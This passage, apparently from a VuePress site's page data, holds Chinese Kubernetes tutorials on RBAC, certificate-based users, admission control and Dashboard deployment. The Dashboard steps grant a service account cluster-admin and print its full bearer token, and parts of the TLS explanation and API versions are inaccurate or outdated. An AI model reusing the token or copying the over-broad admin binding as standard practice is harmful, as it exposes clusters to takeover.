devman.crt -days 3650\n\n# 3) 设置集群、用户、上下文信息\n[root@k8s-master01 pki]# kubectl config set-cluster kubernetes --embed-certs=true --certificate-authority=/etc/kubernetes/pki/ca.crt --server=https://192.168.109.100:6443\n\n[root@k8s-master01 pki]# kubectl config set-credentials devman --embed-certs=true --client-certificate=/etc/kubernetes/pki/devman.crt --client-key=/etc/kubernetes/pki/devman.key\n\n[root@k8s-master01 pki]# kubectl config set-context devman@kubernetes --cluster=kubernetes --user=devman\n\n# 切换账户到devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nSwitched to context "devman@kubernetes".\n\n# 查看dev下pod，发现没有权限\n[root@k8s-master01 pki]# kubectl get pods -n dev\nError from server (Forbidden): pods is forbidden: User "devman" cannot list resource "pods" in API group "" in the namespace "dev"\n\n# 切换到admin账户\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nSwitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n2. 创建 Role 和 RoleBinding，为 devman 用户授权\n\nkind: Role\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: dev-role\nrules:\n- apiGroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n  \n---\n\nkind: RoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: User\n  name: devman\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: Role\n  name: dev-role\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n[root@k8s-master01 pki]# kubectl create -f dev-role.yaml\nrole.rbac.authorization.k8s.io/dev-role created\nrolebinding.rbac.authorization.k8s.io/authorization-role-binding created\n\n\n1\n2\n3\n\n\n3. 切换账户，再次验证\n\n# 切换账户到devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nSwitched to context "devman@kubernetes".\n\n# 再次查看\n[root@k8s-master01 pki]# kubectl get pods -n dev\nNAME                                 READY   STATUS             RESTARTS   AGE\nnginx-deployment-66cb59b984-8wp2k    1/1     Running            0          4d1h\nnginx-deployment-66cb59b984-dc46j    1/1     Running            0          4d1h\nnginx-deployment-66cb59b984-thfck    1/1     Running            0          4d1h\n\n# 为了不影响后面的学习,切回admin账户\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nSwitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 准入控制\n\n通过了前面的认证和授权之后，还需要经过准入控制处理通过之后，apiserver 才会处理这个请求。\n\n准入控制是一个可配置的控制器列表，可以通过在 Api-Server 上通过命令行设置选择执行哪些准入控制器：\n\n--admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,\n                      DefaultStorageClass,ResourceQuota,DefaultTolerationSeconds\n\n\n1\n2\n\n\n只有当所有的准入控制器都检查通过之后，apiserver 才执行该请求，否则返回拒绝。\n\n当前可配置的 Admission Control 准入控制如下：\n\n * AlwaysAdmit：允许所有请求\n * AlwaysDeny：禁止所有请求，一般用于测试\n * AlwaysPullImages：在启动容器之前总去下载镜像\n * DenyExecOnPrivileged：它会拦截所有想在 Privileged Container 上执行命令的请求\n * ImagePolicyWebhook：这个插件将允许后端的一个 Webhook 程序来完成 admission controller 的功能。\n * Service Account：实现 ServiceAccount 实现了自动化\n * SecurityContextDeny：这个插件将使用 SecurityContext 的 Pod 中的定义全部失效\n * ResourceQuota：用于资源配额管理目的，观察所有请求，确保在 namespace 上的配额不会超标\n * LimitRanger：用于资源限制管理，作用于 namespace 上，确保对 Pod 进行资源限制\n * InitialResources：为未设置资源请求与限制的 Pod，根据其镜像的历史资源的使用情况进行设置\n * NamespaceLifecycle：如果尝试在一个不存在的 namespace 中创建资源对象，则该创建请求将被拒绝。当删除一个 namespace 时，系统将会删除该 namespace 中所有对象。\n * DefaultStorageClass：为了实现共享存储的动态供应，为未指定 StorageClass 或 PV 的 PVC 尝试匹配默认的 StorageClass，尽可能减少用户在申请 PVC 时所需了解的后端存储细节\n * DefaultTolerationSeconds：这个插件为那些没有设置 forgiveness tolerations 并具有 notready:NoExecute 和 unreachable:NoExecute 两种 taints 的 Pod 设置默认的 “容忍” 时间，为 5min\n * PodSecurityPolicy：这个插件用于在创建或修改 Pod 时决定是否根据 Pod 的 security context 和可用的 PodSecurityPolicy 对 Pod 的安全策略进行控制',normalizedContent:'# 访问控制概述\n\nkubernetes 作为一个分布式集群的管理工具，保证集群的安全性是其一个重要的任务。所谓的安全性其实就是保证对 kubernetes 的各种客户端进行认证和鉴权操作。\n\n客户端\n在 kubernetes 集群中，客户端通常有两类：\n\n * user account：一般是独立于 kubernetes 之外的其他服务管理的用户账号。\n * service account：kubernetes 管理的账号，用于为 pod 中的服务进程在访问 kubernetes 时提供身份标识。\n\n\n\n认证、授权与准入控制\napiserver 是访问及管理资源对象的唯一入口。任何一个请求访问 apiserver，都要经过下面三个流程：\n\n * authentication（认证）：身份鉴别，只有正确的账号才能够通过认证\n * authorization（授权）： 判断用户是否有权限对访问的资源执行特定的动作\n * admission control（准入控制）：用于补充授权机制以实现更加精细的访问控制功能。\n\n\n# 认证管理\n\nkubernetes 集群安全的最关键点在于如何识别并认证客户端身份，它提供了 3 种客户端身份认证方式：\n\n * http base 认证：通过用户名 + 密码的方式认证\n\n> 这种认证方式是把 “用户名：密码” 用 base64 算法进行编码后的字符串放在 http 请求中的 header authorization 域里发送给服务端。服务端收到后进行解码，获取用户名及密码，然后进行用户身份认证的过程。\n\n * https 证书认证：基于 ca 根证书签名的双向数字证书认证方式\n\n> 这种认证方式是安全性最高的一种方式，但是同时也是操作起来最麻烦的一种方式。\n\n\n\nhttps 认证大体分为 3 个过程：\n1. 证书申请和下发\n\n> https 通信双方的服务器向 ca 机构申请证书，ca 机构下发根证书、服务端证书及私钥给申请者\n\n2. 客户端和服务端的双向认证\n\n> 1> 客户端向服务器端发起请求，服务端下发自己的证书给客户端，\n> 客户端接收到证书后，通过私钥解密证书，在证书中获得服务端的公钥，\n> 客户端利用服务器端的公钥认证证书中的信息，如果一致，则认可这个服务器\n> 2> 客户端发送自己的证书给服务器端，服务端接收到证书后，通过私钥解密证书，\n> 在证书中获得客户端的公钥，并用该公钥认证证书信息，确认客户端是否合法\n\n3. 服务器端和客户端进行通信\n\n> 服务器端和客户端协商好加密方案后，客户端会产生一个随机的秘钥并加密，然后发送到服务器端。\n> 服务器端接收这个秘钥后，双方接下来通信的所有内容都通过该随机秘钥加密\n\n> 注意: kubernetes 允许同时配置多种认证方式，只要其中任意一个方式认证通过即可\n\n\n# 授权管理\n\n授权发生在认证成功之后，通过认证就可以知道请求用户是谁， 然后 kubernetes 会根据事先定义的授权策略来决定用户是否有权限访问，这个过程就称为授权。\n\n每个发送到 apiserver 的请求都带上了用户和资源的信息：比如发送请求的用户、请求的路径、请求的动作等，授权就是根据这些信息和授权策略进行比较，如果符合策略，则认为授权通过，否则会返回错误。\n\napi server 目前支持以下几种授权策略：\n\n * alwaysdeny：表示拒绝所有请求，一般用于测试\n * alwaysallow：允许接收所有请求，相当于集群不需要授权流程（kubernetes 默认的策略）\n * abac：基于属性的访问控制，表示使用用户配置的授权规则对用户请求进行匹配和控制\n * webhook：通过调用外部 rest 服务对用户进行授权\n * node：是一种专用模式，用于对 kubelet 发出的请求进行访问控制\n * rbac：基于角色的访问控制（kubeadm 安装方式下的默认选项）\n\nrbac (role-based access control) 基于角色的访问控制，主要是在描述一件事情：给哪些对象授予了哪些权限\n\n其中涉及到了下面几个概念：\n\n * 对象：user、groups、serviceaccount\n * 角色：代表着一组定义在资源上的可操作动作 (权限) 的集合\n * 绑定：将定义好的角色跟用户绑定在一起\n\n\n\nrbac 引入了 4 个顶级资源对象：\n\n * role、clusterrole：角色，用于指定一组权限\n * rolebinding、clusterrolebinding：角色绑定，用于将角色（权限）赋予给对象\n\nrole、clusterrole\n一个角色就是一组权限的集合，这里的权限都是许可形式的（白名单）。\n\n# role只能对命名空间内的资源进行授权，需要指定nameapce\nkind: role\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: authorization-role\nrules:\n- apigroups: [""]  # 支持的api组列表,"" 空字符串，表示核心api群\n  resources: ["pods"] # 支持的资源对象列表\n  verbs: ["get", "watch", "list"] # 允许的对资源对象的操作方法列表\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# clusterrole可以对集群范围内资源、跨namespaces的范围资源、非资源类型进行授权\nkind: clusterrole\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole\nrules:\n- apigroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n需要详细说明的是，rules 中的参数：\n\n * apigroups: 支持的 api 组列表\n\n"","apps", "autoscaling", "batch"\n\n\n1\n\n * resources：支持的资源对象列表\n\n"services", "endpoints", "pods","secrets","configmaps","crontabs","deployments","jobs",\n"nodes","rolebindings","clusterroles","daemonsets","replicasets","statefulsets",\n"horizontalpodautoscalers","replicationcontrollers","cronjobs"\n\n\n1\n2\n3\n\n * verbs：对资源对象的操作方法列表\n\n"get", "list", "watch", "create", "update", "patch", "delete", "exec"\n\n\n1\n\n\nrolebinding、clusterrolebinding\n角色绑定用来把一个角色绑定到一个目标对象上，绑定目标可以是 user、group 或者 serviceaccount。\n\n# rolebinding可以将同一namespace中的subject绑定到某个role下，则此subject即具有该role定义的权限\nkind: rolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: user\n  name: heima\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: role\n  name: authorization-role\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# clusterrolebinding在整个集群级别和所有namespaces将特定的subject与clusterrole绑定，授予权限\nkind: clusterrolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole-binding\nsubjects:\n- kind: user\n  name: heima\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: clusterrole\n  name: authorization-clusterrole\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nrolebinding 引用 clusterrole 进行授权\nrolebinding 可以引用 clusterrole，对属于同一命名空间内 clusterrole 定义的资源主体进行授权。\n\n> 一种很常用的做法就是，集群管理员为集群范围预定义好一组角色（clusterrole），然后在多个命名空间中重复使用这些 clusterrole。这样可以大幅提高授权管理工作效率，也使得各个命名空间下的基础性授权规则与使用体验保持一致。\n\n# 虽然authorization-clusterrole是一个集群角色，但是因为使用了rolebinding\n# 所以heima只能读取dev命名空间中的资源\nkind: rolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding-ns\n  namespace: dev\nsubjects:\n- kind: user\n  name: heima\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: clusterrole\n  name: authorization-clusterrole\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n实战：创建一个只能管理 dev 空间下 pods 资源的账号\n1. 创建账号\n\n# 1) 创建证书\n[root@k8s-master01 pki]# cd /etc/kubernetes/pki/\n[root@k8s-master01 pki]# (umask 077;openssl genrsa -out devman.key 2048)\n\n# 2) 用apiserver的证书去签署\n# 2-1) 签名申请，申请的用户是devman,组是devgroup\n[root@k8s-master01 pki]# openssl req -new -key devman.key -out devman.csr -subj "/cn=devman/o=devgroup"     \n# 2-2) 签署证书\n[root@k8s-master01 pki]# openssl x509 -req -in devman.csr -ca ca.crt -cakey ca.key -cacreateserial -out devman.crt -days 3650\n\n# 3) 设置集群、用户、上下文信息\n[root@k8s-master01 pki]# kubectl config set-cluster kubernetes --embed-certs=true --certificate-authority=/etc/kubernetes/pki/ca.crt --server=https://192.168.109.100:6443\n\n[root@k8s-master01 pki]# kubectl config set-credentials devman --embed-certs=true --client-certificate=/etc/kubernetes/pki/devman.crt --client-key=/etc/kubernetes/pki/devman.key\n\n[root@k8s-master01 pki]# kubectl config set-context devman@kubernetes --cluster=kubernetes --user=devman\n\n# 切换账户到devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nswitched to context "devman@kubernetes".\n\n# 查看dev下pod，发现没有权限\n[root@k8s-master01 pki]# kubectl get pods -n dev\nerror from server (forbidden): pods is forbidden: user "devman" cannot list resource "pods" in api group "" in the namespace "dev"\n\n# 切换到admin账户\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nswitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n2. 创建 role 和 rolebinding，为 devman 用户授权\n\nkind: role\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: dev-role\nrules:\n- apigroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n  \n---\n\nkind: rolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: user\n  name: devman\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: role\n  name: dev-role\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n[root@k8s-master01 pki]# kubectl create -f dev-role.yaml\nrole.rbac.authorization.k8s.io/dev-role created\nrolebinding.rbac.authorization.k8s.io/authorization-role-binding created\n\n\n1\n2\n3\n\n\n3. 切换账户，再次验证\n\n# 切换账户到devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nswitched to context "devman@kubernetes".\n\n# 再次查看\n[root@k8s-master01 pki]# kubectl get pods -n dev\nname                                 ready   status             restarts   age\nnginx-deployment-66cb59b984-8wp2k    1/1     running            0          4d1h\nnginx-deployment-66cb59b984-dc46j    1/1     running            0          4d1h\nnginx-deployment-66cb59b984-thfck    1/1     running            0          4d1h\n\n# 为了不影响后面的学习,切回admin账户\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nswitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 准入控制\n\n通过了前面的认证和授权之后，还需要经过准入控制处理通过之后，apiserver 才会处理这个请求。\n\n准入控制是一个可配置的控制器列表，可以通过在 api-server 上通过命令行设置选择执行哪些准入控制器：\n\n--admission-control=namespacelifecycle,limitranger,serviceaccount,persistentvolumelabel,\n                      defaultstorageclass,resourcequota,defaulttolerationseconds\n\n\n1\n2\n\n\n只有当所有的准入控制器都检查通过之后，apiserver 才执行该请求，否则返回拒绝。\n\n当前可配置的 admission control 准入控制如下：\n\n * alwaysadmit：允许所有请求\n * alwaysdeny：禁止所有请求，一般用于测试\n * alwayspullimages：在启动容器之前总去下载镜像\n * denyexeconprivileged：它会拦截所有想在 privileged container 上执行命令的请求\n * imagepolicywebhook：这个插件将允许后端的一个 webhook 程序来完成 admission controller 的功能。\n * service account：实现 serviceaccount 实现了自动化\n * securitycontextdeny：这个插件将使用 securitycontext 的 pod 中的定义全部失效\n * resourcequota：用于资源配额管理目的，观察所有请求，确保在 namespace 上的配额不会超标\n * limitranger：用于资源限制管理，作用于 namespace 上，确保对 pod 进行资源限制\n * initialresources：为未设置资源请求与限制的 pod，根据其镜像的历史资源的使用情况进行设置\n * namespacelifecycle：如果尝试在一个不存在的 namespace 中创建资源对象，则该创建请求将被拒绝。当删除一个 namespace 时，系统将会删除该 namespace 中所有对象。\n * defaultstorageclass：为了实现共享存储的动态供应，为未指定 storageclass 或 pv 的 pvc 尝试匹配默认的 storageclass，尽可能减少用户在申请 pvc 时所需了解的后端存储细节\n * defaulttolerationseconds：这个插件为那些没有设置 forgiveness tolerations 并具有 notready:noexecute 和 unreachable:noexecute 两种 taints 的 pod 设置默认的 “容忍” 时间，为 5min\n * podsecuritypolicy：这个插件用于在创建或修改 pod 时决定是否根据 pod 的 security context 和可用的 podsecuritypolicy 对 pod 的安全策略进行控制',charsets:{cjk:!0}},{title:"kubernetes(十三) DashBoard",frontmatter:{title:"kubernetes(十三) DashBoard",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/612",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/612.kubernetes(%E5%8D%81%E4%B8%89)%20DashBoard.html",relativePath:"01.运维/60.Kubernetes/612.kubernetes(十三) DashBoard.md",key:"v-a2835a8a",path:"/kubernetes/612/",headers:[{level:2,title:"部署Dashboard",slug:"部署dashboard",normalizedTitle:"部署 dashboard",charIndex:172},{level:2,title:"使用DashBoard",slug:"使用dashboard",normalizedTitle:"使用 dashboard",charIndex:3508}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"部署Dashboard 使用DashBoard",content:"之前在 kubernetes 中完成的所有操作都是通过命令行工具 kubectl 完成的。其实，为了提供更丰富的用户体验，kubernetes 还开发了一个基于 web 的用户界面（Dashboard）。用户可以使用 Dashboard 部署容器化的应用，还可以监控应用的状态，执行故障排查以及管理 kubernetes 中各种资源。\n\n\n# 部署 Dashboard\n\n1. 下载 yaml，并运行 Dashboard\n\n# 下载yaml\n[root@k8s-master01 ~]# wget  https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml\n\n# 修改kubernetes-dashboard的Service类型\nkind: Service\napiVersion: v1\nmetadata:\n  labels:\n    k8s-app: kubernetes-dashboard\n  name: kubernetes-dashboard\n  namespace: kubernetes-dashboard\nspec:\n  type: NodePort  # 新增\n  ports:\n    - port: 443\n      targetPort: 8443\n      nodePort: 30009  # 新增\n  selector:\n    k8s-app: kubernetes-dashboard\n\n# 部署\n[root@k8s-master01 ~]# kubectl create -f recommended.yaml\n\n# 查看namespace下的kubernetes-dashboard下的资源\n[root@k8s-master01 ~]# kubectl get pod,svc -n kubernetes-dashboard\nNAME                                            READY   STATUS    RESTARTS   AGE\npod/dashboard-metrics-scraper-c79c65bb7-zwfvw   1/1     Running   0          111s\npod/kubernetes-dashboard-56484d4c5-z95z5        1/1     Running   0          111s\n\nNAME                               TYPE       CLUSTER-IP      EXTERNAL-IP  PORT(S)         AGE\nservice/dashboard-metrics-scraper  ClusterIP  10.96.89.218    <none>       8000/TCP        111s\nservice/kubernetes-dashboard       NodePort   10.104.178.171  <none>       443:30009/TCP   111s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n2. 创建访问账户，获取 token\n\n# 创建账号\n[root@k8s-master01-1 ~]# kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard\n\n# 授权\n[root@k8s-master01-1 ~]# kubectl create clusterrolebinding dashboard-admin-rb --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:dashboard-admin\n\n# 获取账号token\n[root@k8s-master01 ~]#  kubectl get secrets -n kubernetes-dashboard | grep dashboard-admin\ndashboard-admin-token-xbqhh        kubernetes.io/service-account-token   3      2m35s\n\n[root@k8s-master01 ~]# kubectl describe secrets dashboard-admin-token-xbqhh -n kubernetes-dashboard\nName:         dashboard-admin-token-xbqhh\nNamespace:    kubernetes-dashboard\nLabels:       <none>\nAnnotations:  kubernetes.io/service-account.name: dashboard-admin\n              kubernetes.io/service-account.uid: 95d84d80-be7a-4d10-a2e0-68f90222d039\n\nType:  kubernetes.io/service-account-token\n\nData\n====\nnamespace:  20 bytes\ntoken:      eyJhbGciOiJSUzI1NiIsImtpZCI6ImJrYkF4bW5XcDhWcmNGUGJtek5NODFuSXl1aWptMmU2M3o4LTY5a2FKS2cifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYXNoYm9hcmQtYWRtaW4tdG9rZW4teGJxaGgiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFzaGJvYXJkLWFkbWluIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiOTVkODRkODAtYmU3YS00ZDEwLWEyZTAtNjhmOTAyMjJkMDM5Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmVybmV0ZXMtZGFzaGJvYXJkOmRhc2hib2FyZC1hZG1pbiJ9.NAl7e8ZfWWdDoPxkqzJzTB46sK9E8iuJYnUI9vnBaY3Jts7T1g1msjsBnbxzQSYgAG--cV0WYxjndzJY_UWCwaGPrQrt_GunxmOK9AUnzURqm55GR2RXIZtjsWVP2EBatsDgHRmuUbQvTFOvdJB4x3nXcYLN2opAaMqg3rnU2rr-A8zCrIuX_eca12wIp_QiuP3SF-tzpdLpsyRfegTJZl6YnSGyaVkC9id-cxZRb307qdCfXPfCHR_2rt5FVfxARgg_C0e3eFHaaYQO7CitxsnIoIXpOFNAR8aUrmopJyODQIPqBWUehb7FhlU1DCduHnIIXVC_UICZ-MKYewBDLw\nca.crt:     1025 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n3. 通过浏览器访问 Dashboard 的 UI\n在登录页面上输入上面的 token\n\n\n\n出现下面的页面代表成功\n\n\n\n\n# 使用 DashBoard\n\n查看\n选择指定的命名空间 dev ，然后点击 Deployments ，查看 dev 空间下的所有 deployment\n\n\n\n扩缩容\n在 Deployment 上点击 规模 ，然后指定 目标副本数量 ，点击确定\n\n\n\n编辑\n在 Deployment 上点击 编辑 ，然后修改 yaml文件 ，点击确定\n\n\n\n查看 Pod\n点击 Pods , 查看 pods 列表\n\n\n\n操作 Pod\n选中某个 Pod，可以对其执行日志（logs）、进入执行（exec）、编辑、删除操作\n\n",normalizedContent:"之前在 kubernetes 中完成的所有操作都是通过命令行工具 kubectl 完成的。其实，为了提供更丰富的用户体验，kubernetes 还开发了一个基于 web 的用户界面（dashboard）。用户可以使用 dashboard 部署容器化的应用，还可以监控应用的状态，执行故障排查以及管理 kubernetes 中各种资源。\n\n\n# 部署 dashboard\n\n1. 下载 yaml，并运行 dashboard\n\n# 下载yaml\n[root@k8s-master01 ~]# wget  https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml\n\n# 修改kubernetes-dashboard的service类型\nkind: service\napiversion: v1\nmetadata:\n  labels:\n    k8s-app: kubernetes-dashboard\n  name: kubernetes-dashboard\n  namespace: kubernetes-dashboard\nspec:\n  type: nodeport  # 新增\n  ports:\n    - port: 443\n      targetport: 8443\n      nodeport: 30009  # 新增\n  selector:\n    k8s-app: kubernetes-dashboard\n\n# 部署\n[root@k8s-master01 ~]# kubectl create -f recommended.yaml\n\n# 查看namespace下的kubernetes-dashboard下的资源\n[root@k8s-master01 ~]# kubectl get pod,svc -n kubernetes-dashboard\nname                                            ready   status    restarts   age\npod/dashboard-metrics-scraper-c79c65bb7-zwfvw   1/1     running   0          111s\npod/kubernetes-dashboard-56484d4c5-z95z5        1/1     running   0          111s\n\nname                               type       cluster-ip      external-ip  port(s)         age\nservice/dashboard-metrics-scraper  clusterip  10.96.89.218    <none>       8000/tcp        111s\nservice/kubernetes-dashboard       nodeport   10.104.178.171  <none>       443:30009/tcp   111s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n2. 创建访问账户，获取 token\n\n# 创建账号\n[root@k8s-master01-1 ~]# kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard\n\n# 授权\n[root@k8s-master01-1 ~]# kubectl create clusterrolebinding dashboard-admin-rb --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:dashboard-admin\n\n# 获取账号token\n[root@k8s-master01 ~]#  kubectl get secrets -n kubernetes-dashboard | grep dashboard-admin\ndashboard-admin-token-xbqhh        kubernetes.io/service-account-token   3      2m35s\n\n[root@k8s-master01 ~]# kubectl describe secrets dashboard-admin-token-xbqhh -n kubernetes-dashboard\nname:         dashboard-admin-token-xbqhh\nnamespace:    kubernetes-dashboard\nlabels:       <none>\nannotations:  kubernetes.io/service-account.name: dashboard-admin\n              kubernetes.io/service-account.uid: 95d84d80-be7a-4d10-a2e0-68f90222d039\n\ntype:  kubernetes.io/service-account-token\n\ndata\n====\nnamespace:  20 bytes\ntoken:      eyjhbgcioijsuzi1niisimtpzci6imjrykf4bw5xcdhwcmngugjtek5nodfusxl1awptmmu2m3o4lty5a2fks2cifq.eyjpc3mioijrdwjlcm5ldgvzl3nlcnzpy2vhy2nvdw50iiwia3vizxjuzxrlcy5pby9zzxj2awnlywnjb3vudc9uyw1lc3bhy2uioijrdwjlcm5ldgvzlwrhc2hib2fyzcisimt1ymvybmv0zxmuaw8vc2vydmljzwfjy291bnqvc2vjcmv0lm5hbwuioijkyxnoym9hcmqtywrtaw4tdg9rzw4tegjxaggilcjrdwjlcm5ldgvzlmlvl3nlcnzpy2vhy2nvdw50l3nlcnzpy2utywnjb3vudc5uyw1lijoizgfzagjvyxjklwfkbwluiiwia3vizxjuzxrlcy5pby9zzxj2awnlywnjb3vudc9zzxj2awnllwfjy291bnqudwlkijoiotvkodrkodatymu3ys00zdewlweyztatnjhmotaymjjkmdm5iiwic3viijoic3lzdgvtonnlcnzpy2vhy2nvdw50omt1ymvybmv0zxmtzgfzagjvyxjkomrhc2hib2fyzc1hzg1pbij9.nal7e8zfwwddopxkqzjztb46sk9e8iujynui9vnbay3jts7t1g1msjsbnbxzqsygag--cv0wyxjndzjy_uwcwagprqrt_gunxmok9aunzurqm55gr2rxiztjswvp2ebatsdghrmuubqvtfovdjb4x3nxcyln2opaamqg3rnu2rr-a8zcriux_eca12wip_qiup3sf-tzpdlpsyrfegtjzl6ynsgyavkc9id-cxzrb307qdcfxpfchr_2rt5fvfxargg_c0e3efhaayqo7citxsnioixpofnar8aurmopjyodqipqbwuehb7fhlu1dcduhniixvc_uicz-mkyewbdlw\nca.crt:     1025 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n3. 通过浏览器访问 dashboard 的 ui\n在登录页面上输入上面的 token\n\n\n\n出现下面的页面代表成功\n\n\n\n\n# 使用 dashboard\n\n查看\n选择指定的命名空间 dev ，然后点击 deployments ，查看 dev 空间下的所有 deployment\n\n\n\n扩缩容\n在 deployment 上点击 规模 ，然后指定 目标副本数量 ，点击确定\n\n\n\n编辑\n在 deployment 上点击 编辑 ，然后修改 yaml文件 ，点击确定\n\n\n\n查看 pod\n点击 pods , 查看 pods 列表\n\n\n\n操作 pod\n选中某个 pod，可以对其执行日志（logs）、进入执行（exec）、编辑、删除操作\n\n",charsets:{cjk:!0}},{title:"Home",frontmatter:{home:!0,heroImage:"/assets/img/logo.png",heroText:"BigUncle技术博客",bannerBg:"none",postList:"none",simplePostListLength:0,hideRightBar:!0},regularPath:"/",relativePath:"index.md",key:"v-59de6d20",path:"/",lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:null,content:"",normalizedContent:"",charsets:{}}],themeConfig:{nav:[{text:"首页",link:"/"},{text:"Java",items:[{text:"Java",link:"/java/100/"},{text:"Maven",link:"/maven/2300/"},{text:"Spring",items:[{text:"Spring",link:"/spring/spring/200/"},{text:"Spring MVC",link:"/spring/spring-mvc/200/"},{text:"Spring Boot",link:"/spring/spring-boot/200/"},{text:"Spring Cloud",link:"/spring/spring-cloud/200/"}]},{text:"Mybatis",items:[{text:"Mybatis",link:"/mybatis/mybatis/300/"},{text:"Mybatis 